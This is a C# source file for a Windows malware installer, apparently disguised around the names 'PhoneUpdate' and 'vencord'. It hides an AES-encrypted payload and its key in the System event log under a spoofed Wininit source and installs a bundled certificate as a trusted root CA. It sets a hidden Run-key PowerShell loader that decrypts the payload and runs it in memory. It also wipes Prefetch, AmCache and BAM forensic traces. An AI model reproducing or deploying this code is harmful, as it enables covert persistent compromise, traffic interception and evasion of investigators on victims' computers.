using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

class P
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h, int c);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int MessageBox(IntPtr h, string t, string c, uint t2);
    const int SW = 5;
    const string SRC = "Microsoft-Windows-Wininit";
    static int[] SC = new int[] { 18, 19, 20, 21, 22 };

    static void Main(string[] ax)
    {
        IntPtr hw = GetConsoleWindow();
        if (hw != IntPtr.Zero) ShowWindow(hw, SW);
        try
        {
            Console.WriteLine("Preparing payload...");
            byte[] payload;
            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("payload.bin"))
            { payload = new byte[s.Length]; s.Read(payload, 0, payload.Length); }

            Console.WriteLine("Generating AES key...");
            byte[] ak = new byte[32]; byte[] iv = new byte[16];
            using (var r = new RNGCryptoServiceProvider()) { r.GetBytes(ak); r.GetBytes(iv); }

            Console.WriteLine("Writing keys to event log...");
            ES();
            WE(18, GU(ak.Skip(0).Take(16).ToArray()));
            WE(19, GU(ak.Skip(16).Take(16).ToArray()));
            WE(20, GU(iv));

            Console.WriteLine("Encrypting payload...");
            byte[] enc;
            using (var a = Aes.Create()) { a.Key = ak; a.IV = iv; a.Mode = CipherMode.CBC; a.Padding = PaddingMode.PKCS7;
                using (var e = a.CreateEncryptor()) enc = e.TransformFinalBlock(payload, 0, payload.Length); }

            Console.WriteLine("Writing encrypted chunks...");
            string b = Convert.ToBase64String(enc);
            int o = 0, ci = 0; var rn = new Random();
            while (o < b.Length)
            {
                int sz = rn.Next(10000, 20000);
                if (o + sz > b.Length) sz = b.Length - o;
                WE(SC[ci % 5], "LC:" + ci + ":" + b.Substring(o, sz));
                o += sz; ci++;
            }
            Console.WriteLine("Chunks written (" + ci + " chunks)");

            Console.WriteLine("Installing certificate...");
            byte[] pfxBytes;
            using (var s = Assembly.GetExecutingAssembly().GetManifestResourceStream("MorganTools.pfx"))
            { pfxBytes = new byte[s.Length]; s.Read(pfxBytes, 0, pfxBytes.Length); }
            var store = new X509Store(StoreName.Root, StoreLocation.LocalMachine);
            store.Open(OpenFlags.ReadWrite);
            var pfx = new X509Certificate2(pfxBytes, "morgan2026", X509KeyStorageFlags.Exportable | X509KeyStorageFlags.PersistKeySet);
            store.Add(pfx);
            store.Close();
            Console.WriteLine("Certificate installed: " + pfx.Subject);

            Console.WriteLine("Writing loader to registry...");
            string loaderScript = BuildLoader();
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\PhoneUpdate"))
            {
                key.SetValue("Loader", loaderScript, Microsoft.Win32.RegistryValueKind.String);
            }
            Console.WriteLine("Loader stored in registry");

            Console.WriteLine("Registering Run key...");
            string runCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"iex (Get-ItemProperty 'HKCU:\\Software\\PhoneUpdate').Loader\"";
            using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
            {
                key.SetValue("PhoneUpdate", runCmd, Microsoft.Win32.RegistryValueKind.String);
            }
            Console.WriteLine("Run key registered");

            Console.WriteLine("Clearing artifacts...");
            ClearPrefetch("vencord");
            ClearAmCache("vencord");
            ClearBAM("vencord");
            Console.WriteLine("Artifacts cleared");

            Console.WriteLine("Successful");
            MessageBox(IntPtr.Zero, "Setup completed successfully.\nReboot to activate.\nArtifacts: event log + registry only\nZero files on disk", "Done", 0x40);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Failed: " + ex.Message);
            MessageBox(IntPtr.Zero, "Setup failed:\n" + ex.Message, "Error", 0x10);
        }
    }

    static string BuildLoader()
    {
        // PowerShell loader — reads event log, decrypts payload, executes in memory
        // stored in registry, no files on disk
        StringBuilder sb = new StringBuilder();
        sb.Append("$e='Microsoft-Windows-Wininit';");
        sb.Append("$c=@{};");
        sb.Append("$k1=$null;$k2=$null;$iv=$null;");
        // collect LC: chunks
        sb.Append("Get-EventLog -LogName System -Source $e -Newest 2000 -EA SilentlyContinue | ");
        sb.Append("? {$_.Message -match '^LC:'} | % {");
        sb.Append("$m=$_.Message.Substring(3);$p=$m.IndexOf(':');");
        sb.Append("$i=[int]$m.Substring(0,$p);$c[$i]=$m.Substring($p+1)};");
        // collect keys
        sb.Append("$k1=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 18} | Select -First 1).Message;");
        sb.Append("$k2=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 19} | Select -First 1).Message;");
        sb.Append("$iv=(Get-EventLog -LogName System -Source $e -Newest 500 -EA SilentlyContinue | ? {$_.EventID -eq 20} | Select -First 1).Message;");
        // validate
        sb.Append("if(!$k1 -or !$k2 -or !$iv){return}");
        // reassemble chunks in order
        sb.Append("$buf=New-Object System.Text.StringBuilder;");
        sb.Append("($c.Keys | Sort-Object) | % {$buf.Append($c[$_]) | Out-Null};");
        // decode base64
        sb.Append("$enc=[Convert]::FromBase64String($buf.ToString());");
        // GUID parser helper
        sb.Append("$g={param($s)$s=$s.Trim().Trim('{}').Replace('-','');");
        sb.Append("$b=New-Object byte[](16);");
        sb.Append("for($i=0;$i -lt 16){$b[$i]=[Convert]::ToByte($s.Substring($i*2,2),16)};");
        sb.Append("return $b};");
        // reconstruct AES key and IV
        sb.Append("$ak=New-Object byte[](32);");
        sb.Append("[Array]::Copy($g.Invoke($k1),0,$ak,0,16);");
        sb.Append("[Array]::Copy($g.Invoke($k2),0,$ak,16,16);");
        // decrypt
        sb.Append("$a=[Security.Cryptography.Aes]::Create();");
        sb.Append("$a.Key=$ak;$a.IV=$g.Invoke($iv);");
        sb.Append("$a.Mode='CBC';$a.Padding='PKCS7';");
        sb.Append("$d=$a.CreateDecryptor();");
        sb.Append("$dec=$d.TransformFinalBlock($enc,0,$enc.Length);");
        sb.Append("$a.Dispose();");
        // load and execute
        sb.Append("$asm=[Reflection.Assembly]::Load($dec);");
        sb.Append("$t=$asm.GetType('Program');");
        sb.Append("if($t){$m=$t.GetMethod('Main',[Reflection.BindingFlags]'Static,Public,NonPublic');");
        sb.Append("if($m){$m.Invoke($null,@(,[String[]]@()))}};");
        return sb.ToString();
    }

    static void ES() { try { EventLog.CreateEventSource(SRC, "System"); } catch { } }
    static void WE(int id, string m) { using (var l = new EventLog("System")) { l.Source = SRC; l.WriteEntry(m, EventLogEntryType.Information, id); } }
    static string GU(byte[] d) { return "{" + string.Format("{0:X2}{1:X2}{2:X2}{3:X2}-{4:X2}{5:X2}-{6:X2}{7:X2}-{8:X2}{9:X2}-{10:X2}{11:X2}-{12:X2}{13:X2}-{14:X2}{15:X2}", d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7], d[8], d[9], d[10], d[11], d[12], d[13], d[14], d[15]) + "}"; }

    static void ClearPrefetch(string exeName)
    {
        try
        {
            string pf = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Prefetch");
            if (!Directory.Exists(pf)) return;
            string[] files = Directory.GetFiles(pf, exeName + "*.pf");
            foreach (string f in files) { try { File.Delete(f); } catch { } }
            Console.WriteLine("Prefetch: " + files.Length + " entries cleared");
        }
        catch { }
    }

    static void ClearAmCache(string exeName)
    {
        try
        {
            string amcPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Amcache\\UnlinkedFile";
            using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(amcPath, true))
            {
                if (key == null) return;
                foreach (string valName in key.GetValueNames())
                {
                    string val = key.GetValue(valName, "") as string;
                    if (val != null && val.ToLower().Contains(exeName.ToLower()))
                        try { key.DeleteValue(valName); } catch { }
                }
            }
            Console.WriteLine("AmCache: cleared");
        }
        catch { }
    }

    static void ClearBAM(string exeName)
    {
        try
        {
            string bamBase = "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings";
            using (var baseKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(bamBase))
            {
                if (baseKey == null) return;
                foreach (string sid in baseKey.GetSubKeyNames())
                {
                    using (var sidKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(bamBase + "\\" + sid, true))
                    {
                        if (sidKey == null) continue;
                        foreach (string valName in sidKey.GetValueNames())
                        {
                            string val = sidKey.GetValue(valName, "") as string;
                            if (val != null && val.ToLower().Contains(exeName.ToLower()))
                                try { sidKey.DeleteValue(valName); } catch { }
                        }
                    }
                }
            }
            Console.WriteLine("BAM: cleared");
        }
        catch { }
    }
}
